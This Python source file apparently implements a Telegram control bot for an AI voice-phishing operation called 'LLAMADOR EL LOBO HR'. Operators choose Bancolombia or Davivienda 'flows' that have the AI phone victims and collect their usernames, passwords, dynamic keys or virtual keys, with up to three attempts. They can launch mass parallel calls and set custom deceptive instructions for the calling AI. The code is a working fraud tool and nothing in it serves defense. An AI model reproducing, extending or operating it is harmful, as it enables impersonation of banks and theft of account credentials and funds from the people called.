from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from loguru import logger
from config import settings
from typing import TYPE_CHECKING
from call_flows import CallFlows

if TYPE_CHECKING:
    from main import CallerBot


class TelegramBot:
    def __init__(self, caller_bot: 'CallerBot'):
        self.caller_bot = caller_bot
        self.app = Application.builder().token(settings.telegram_bot_token).build()
        self.saved_instructions = {}  # Diccionario para guardar instrucciones
        self.current_flow = {}  # Diccionario para rastrear flujo activo por chat
        self._setup_handlers()
    
    def _setup_handlers(self):
        """Comandos simplificados - Solo lo esencial"""
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("flujos", self.flows_command))
        self.app.add_handler(CommandHandler("llamar", self.call_command))
        self.app.add_handler(CommandHandler("masivo", self.mass_call_command))
        self.app.add_handler(CommandHandler("activas", self.active_calls_command))
        self.app.add_handler(CommandHandler("colgar", self.hangup_all_command))
        self.app.add_handler(CommandHandler("instruccion", self.set_instruction_command))
        self.app.add_handler(CallbackQueryHandler(self.button_callback))
    
    def _is_admin(self, user_id: int) -> bool:
        """Verificar si el usuario es administrador"""
        return user_id in settings.admin_ids_list
    
    def _is_admin_or_group(self, chat_id: int) -> bool:
        """Verificar si es admin o grupo autorizado"""
        return chat_id in settings.admin_ids_list
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Comando /start"""
        chat_id = update.effective_chat.id
        
        if not self._is_admin_or_group(chat_id):
            await update.message.reply_text("❌ Este grupo/usuario no tiene autorización.")
            return
        
        welcome_message = """📞 **LLAMADOR EL LOBO HR**

🎯 **COMANDOS PRINCIPALES:**
/flujos - 🏦 Seleccionar flujo bancario
/llamar +57312... - Hacer llamada
/masivo +num1 +num2 - Llamadas múltiples
/activas - Ver llamadas activas
/colgar - Colgar tcodas

📝 **PERSONALIZAR IA:**
/instruccion <texto> - Cambiar comportamiento

🏦 **FLUJOS DISPONIBLES:**
• Bancolombia - Validación con app y clave dinámica
• Davivienda - Validación con clave virtual

💡 **Ejemplo de uso:**
1. /flujos → Selecciona Bancolombia
2. /llamar +573012345678
3. La IA seguirá el flujo automáticamente"""
        await update.message.reply_text(welcome_message, parse_mode='Markdown')
    
    async def call_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Comando /llamar"""
        if not self._is_admin_or_group(update.effective_chat.id):
            await update.message.reply_text("❌ Este grupo no tiene autorización.")
            return
        
        if not context.args or len(context.args) == 0:
            await update.message.reply_text("❌ Uso: /llamar <numero>\nEjemplo: /llamar +34612345678")
            return
        
        phone_number = context.args[0].strip()
        
        # Validar formato de número
        if not phone_number.startswith('+'):
            await update.message.reply_text("❌ El número debe incluir el código de país con '+'\nEjemplo: +34612345678")
            return
        
        # Mostrar flujo activo si hay uno configurado
        chat_id = update.effective_chat.id
        flow_info = ""
        if chat_id in self.current_flow:
            flow_name = self.current_flow[chat_id]
            flow = CallFlows.get_flow(flow_name)
            if flow:
                flow_info = f"\n🏦 Flujo: {flow['icon']} {flow['name']}"
                logger.info(f"📞 Llamando con flujo {flow['name']} activo")
        else:
            logger.warning("⚠️ No hay flujo configurado para este chat")
            await update.message.reply_text(
                "⚠️ **NO HAY FLUJO CONFIGURADO**\n\n"
                "Por favor selecciona un flujo antes de llamar:\n"
                "1️⃣ Usa /flujos\n"
                "2️⃣ Selecciona el banco\n"
                "3️⃣ Luego usa /llamar +numero",
                parse_mode='Markdown'
            )
            return
        
        await update.message.reply_text(f"📞 Iniciando llamada a {phone_number}{flow_info}...")
        
        try:
            call_sid = await self.caller_bot.voip_manager.make_call(
                phone_number,
                update.effective_chat.id
            )
            
            keyboard = [[InlineKeyboardButton("🔴 Colgar", callback_data=f"hangup_{call_sid}")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                f"✅ Llamada iniciada\n📱 Número: {phone_number}\n🆔 Call ID: {call_sid[:8]}",
                reply_markup=reply_markup
            )
        except Exception as e:
            logger.error(f"Error al realizar llamada: {e}")
            await update.message.reply_text(f"❌ Error al realizar la llamada: {str(e)}")
    
    async def set_instruction_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Comando /instruccion - Configurar IA de forma simple"""
        if not self._is_admin_or_group(update.effective_chat.id):
            return
        
        if not context.args:
            await update.message.reply_text(
                "❌ Uso: /instruccion <texto>\n\n"
                "📝 Ejemplo:\n"
                "/instruccion Eres LLAMADOR EL LOBO HR. Valida la identidad del cliente "
                "solicitando que descargue la app SOY YO para verificación biométrica. "
                "Sé amable, profesional y breve.\n\n"
                "💡 Tip: Usa /flujos para flujos predefinidos de Bancolombia y Davivienda"
            )
            return
        
        # Unir todos los argumentos en un texto
        custom_instruction = ' '.join(context.args)
        
        try:
            self.caller_bot.ai_conversation.set_custom_prompt(custom_instruction)
            # Limpiar flujo activo si se usa instrucción manual
            chat_id = update.effective_chat.id
            if chat_id in self.current_flow:
                del self.current_flow[chat_id]
            
            await update.message.reply_text(
                f"✅ Instrucción Configurada\n\n"
                f"📝 {custom_instruction}\n\n"
                f"👉 IA seguirá estas instrucciones"
            )
            
            logger.info(f"Instrucción configurada: {custom_instruction[:80]}...")
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
    
    async def flows_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Comando /flujos - Seleccionar flujo bancario predefinido"""
        if not self._is_admin_or_group(update.effective_chat.id):
            return
        
        # Crear botones para cada flujo disponible
        keyboard = []
        for flow_name in CallFlows.get_available_flows():
            flow = CallFlows.get_flow(flow_name)
            button = InlineKeyboardButton(
                f"{flow['icon']} {flow['name']}",
                callback_data=f"flow_{flow_name}"
            )
            keyboard.append([button])
        
        # Botón para limpiar flujo
        keyboard.append([InlineKeyboardButton("🔄 Limpiar Flujo", callback_data="flow_clear")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message = """🏦 **FLUJOS BANCARIOS DISPONIBLES**

Selecciona el flujo que deseas usar para las llamadas:

🏦 **Bancolombia**
• Validación completa con app
• Usuario + Clave principal + Clave dinámica
• 3 intentos para clave dinámica

🏛️ **Davivienda**
• Validación con clave virtual
• Documento + Clave virtual
• 3 intentos para clave virtual

💡 Una vez seleccionado, todas las llamadas seguirán ese flujo automáticamente."""
        
        await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='Markdown')
    
    async def mass_call_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Comando /masivo - Llamar a múltiples números simultáneamente"""
        if not self._is_admin_or_group(update.effective_chat.id):
            return
        
        if not context.args:
            await update.message.reply_text(
                "📞 Llamadas Masivas\n\n"
                "Uso: /masivo +num1 +num2 +num3 ...\n\n"
                "Ejemplo:\n"
                "/masivo +573012345678 +573098765432\n\n"
                f"Máximo: {settings.max_concurrent_calls} llamadas simultáneas"
            )
            return
        
        numbers = [n.strip() for n in context.args if n.strip().startswith('+')]
        
        if len(numbers) > settings.max_concurrent_calls:
            await update.message.reply_text(
                f"⚠️ Máximo {settings.max_concurrent_calls} llamadas simultáneas\n"
                f"Recibidos: {len(numbers)} números"
            )
            return
        
        if not numbers:
            await update.message.reply_text("❌ No se encontraron números válidos (deben empezar con +)")
            return
        
        await update.message.reply_text(f"🚀 Iniciando {len(numbers)} llamadas en paralelo...")
        
        # Llamar en paralelo para máxima velocidad
        import asyncio
        tasks = []
        for phone_number in numbers:
            task = self.caller_bot.voip_manager.make_call(
                phone_number,
                update.effective_chat.id
            )
            tasks.append(task)
        
        # Ejecutar todas las llamadas simultáneamente
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        success_count = 0
        failed = []
        
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                failed.append(f"{numbers[i]}: {str(result)}")
            else:
                success_count += 1
        
        result_msg = f"✅ *Llamadas Iniciadas: {success_count}/{len(numbers)}*\n\n"
        
        if failed:
            result_msg += "❌ *Fallidas:*\n" + "\n".join(failed[:5])
            if len(failed) > 5:
                result_msg += f"\n... y {len(failed)-5} más"
        
        result_msg += "\n\nUsa `/activas` para ver todas las llamadas"
        
        await update.message.reply_text(result_msg)
    
    async def active_calls_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Comando /activas - Ver y controlar llamadas activas con botones"""
        if not self._is_admin_or_group(update.effective_chat.id):
            return
        
        active_calls = await self.caller_bot.voip_manager.get_active_calls()
        
        if not active_calls:
            await update.message.reply_text("📭 No hay llamadas activas")
            return
        
        # Agrupar llamadas por estado
        in_progress = [c for c in active_calls if c['status'] in ['in-progress', 'answered']]
        ringing = [c for c in active_calls if c['status'] == 'ringing']
        other = [c for c in active_calls if c not in in_progress and c not in ringing]
        
        message = f"📞 *LLAMADAS ACTIVAS ({len(active_calls)})*\n\n"
        
        # Botones para control rápido
        keyboard = []
        
        if in_progress:
            message += f"🟢 *En Curso ({len(in_progress)}):*\n"
            for call in in_progress[:10]:
                duration_min = call['duration'] // 60
                duration_sec = call['duration'] % 60
                message += f"• {call['number']} - {duration_min}:{duration_sec:02d}\n"
                message += f"  `{call['sid'][:8]}`\n"
                keyboard.append([
                    InlineKeyboardButton(
                        f"🔴 Colgar {call['number'][-4:]}", 
                        callback_data=f"hangup_{call['sid']}"
                    )
                ])
            message += "\n"
        
        if ringing:
            message += f"📱 *Timbrando ({len(ringing)}):*\n"
            for call in ringing[:5]:
                message += f"• {call['number']}\n"
            message += "\n"
        
        if len(active_calls) > 15:
            message += f"... y {len(active_calls) - 15} llamadas más\n\n"
        
        # Botones de control global
        keyboard.append([
            InlineKeyboardButton("🔴 Colgar Todas", callback_data="hangup_all"),
            InlineKeyboardButton("🔄 Actualizar", callback_data="refresh_calls")
        ])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(message, reply_markup=reply_markup)
    
    async def hangup_all_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Comando /colgar_todas - Finalizar todas las llamadas activas"""
        if not self._is_admin_or_group(update.effective_chat.id):
            return
        
        active_calls = await self.caller_bot.voip_manager.get_active_calls()
        
        if not active_calls:
            await update.message.reply_text("📭 No hay llamadas activas para colgar")
            return
        
        # Confirmación con botón
        keyboard = [[
            InlineKeyboardButton("✅ Sí, colgar todas", callback_data="confirm_hangup_all"),
            InlineKeyboardButton("❌ Cancelar", callback_data="cancel_action")
        ]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"⚠️ ¿Colgar {len(active_calls)} llamadas activas?",
            reply_markup=reply_markup
        )
    
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Manejar callbacks de botones"""
        query = update.callback_query
        await query.answer()
        
        # Manejar selección de flujos
        if query.data.startswith("flow_"):
            flow_name = query.data.split("_", 1)[1]
            chat_id = update.effective_chat.id
            
            if flow_name == "clear":
                # Limpiar flujo activo
                if chat_id in self.current_flow:
                    del self.current_flow[chat_id]
                self.caller_bot.ai_conversation.set_custom_prompt("")
                await query.edit_message_text("🔄 Flujo limpiado. IA volverá al comportamiento por defecto.")
                logger.info(f"Flujo limpiado para chat {chat_id}")
                return
            
            # Configurar flujo seleccionado
            flow = CallFlows.get_flow(flow_name)
            if not flow:
                await query.edit_message_text("❌ Flujo no encontrado")
                logger.error(f"❌ Flujo '{flow_name}' no existe en CallFlows.FLOWS")
                return
            
            # Guardar flujo activo para este chat
            self.current_flow[chat_id] = flow_name
            logger.info(f"🎯 Chat {chat_id} seleccionó flujo: {flow_name}")
            
            # Configurar prompt de IA con logging detallado
            logger.info(f"🤖 Configurando IA con prompt de {flow['name']}...")
            logger.info(f"📝 Prompt length: {len(flow['prompt'])} caracteres")
            logger.info(f"📝 Primeras 100 chars: {flow['prompt'][:100]}...")
            
            self.caller_bot.ai_conversation.set_custom_prompt(flow["prompt"])
            
            # Verificar que se guardó correctamente
            saved_prompt = self.caller_bot.ai_conversation.custom_instruction
            if saved_prompt == flow["prompt"]:
                logger.info(f"✅ Prompt guardado correctamente en AI conversation")
            else:
                logger.error(f"⚠️ Prompt NO se guardó correctamente!")
            
            await query.edit_message_text(
                f"✅ **🎯 FLUJO ACTIVADO: {flow['name'].upper()}**\n\n"
                f"{flow['icon']} **{flow['name']}**\n"
                f"{flow['description']}\n\n"
                f"🔑 **El flujo está LISTO para usar**\n\n"
                f"📢 Siguiente paso:\n"
                f"• /llamar +numero - para una llamada\n"
                f"• /masivo +num1 +num2 - para varias llamadas\n\n"
                f"🤖 La IA seguirá EXACTAMENTE el flujo de {flow['name']}",
                parse_mode='Markdown'
            )
            
            logger.info(f"✅ Flujo {flow_name} ({flow['name']}) ACTIVADO completamente para chat {chat_id}")
            return
        
        if query.data.startswith("hangup_"):
            call_sid = query.data.split("_", 1)[1]
            try:
                await self.caller_bot.voip_manager.hangup_call(call_sid)
                await query.edit_message_text(f"🔴 Llamada {call_sid[:8]} finalizada")
            except Exception as e:
                await query.edit_message_text(f"❌ Error: {str(e)}")
        
        elif query.data == "hangup_all":
            await query.answer("⚠️ Usa /colgar_todas para confirmar")
        
        elif query.data == "confirm_hangup_all":
            # Usar método optimizado para colgar todas
            result = await self.caller_bot.voip_manager.hangup_all_calls()
            
            if result['total'] == 0:
                await query.edit_message_text("📭 No hay llamadas activas")
            else:
                msg = f"🔴 *Llamadas Finalizadas*\n\n"
                msg += f"✅ Exitosas: {result['success']}\n"
                if result['failed'] > 0:
                    msg += f"❌ Fallidas: {result['failed']}\n"
                msg += f"📊 Total: {result['total']}"
                await query.edit_message_text(msg)
        
        elif query.data == "refresh_calls":
            active_calls = await self.caller_bot.voip_manager.get_active_calls()
            
            if not active_calls:
                await query.edit_message_text("📭 No hay llamadas activas")
                return
            
            message = f"📞 *LLAMADAS ACTIVAS ({len(active_calls)})*\n\n"
            keyboard = []
            
            for call in active_calls[:10]:
                duration_min = call['duration'] // 60
                duration_sec = call['duration'] % 60
                message += f"• {call['number']} - {duration_min}:{duration_sec:02d}\n"
                keyboard.append([
                    InlineKeyboardButton(
                        f"🔴 {call['number'][-4:]}", 
                        callback_data=f"hangup_{call['sid']}"
                    )
                ])
            
            keyboard.append([
                InlineKeyboardButton("🔴 Colgar Todas", callback_data="hangup_all"),
                InlineKeyboardButton("🔄 Actualizar", callback_data="refresh_calls")
            ])
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(message, reply_markup=reply_markup)
        
        elif query.data == "cancel_action":
            await query.edit_message_text("❌ Acción cancelada")
    
    async def send_message(self, chat_id: int, text: str, **kwargs):
        """Enviar mensaje a un chat con manejo robusto"""
        try:
            # Intentar enviar directamente
            await self.app.bot.send_message(chat_id=chat_id, text=text, **kwargs)
        except RuntimeError as e:
            if "event loop" in str(e).lower():
                # Problema de event loop - ejecutar en el loop del bot
                try:
                    import asyncio
                    loop = self.app.bot._updater.loop if hasattr(self.app.bot, '_updater') else asyncio.get_event_loop()
                    if loop and loop.is_running():
                        future = asyncio.run_coroutine_threadsafe(
                            self.app.bot.send_message(chat_id=chat_id, text=text, **kwargs),
                            loop
                        )
                        future.result(timeout=3)
                except Exception as inner_e:
                    logger.error(f"Error en fallback de send_message: {inner_e}")
            else:
                logger.error(f"RuntimeError en send_message: {e}")
        except Exception as e:
            logger.error(f"Error enviando mensaje: {e}")
    
    async def start(self):
        """Iniciar el bot"""
        await self.app.initialize()
        await self.app.start()
        await self.app.updater.start_polling()
        logger.info("✅ Bot de Telegram iniciado")
    
    async def stop(self):
        """Detener el bot"""
        await self.app.updater.stop()
        await self.app.stop()
        await self.app.shutdown()
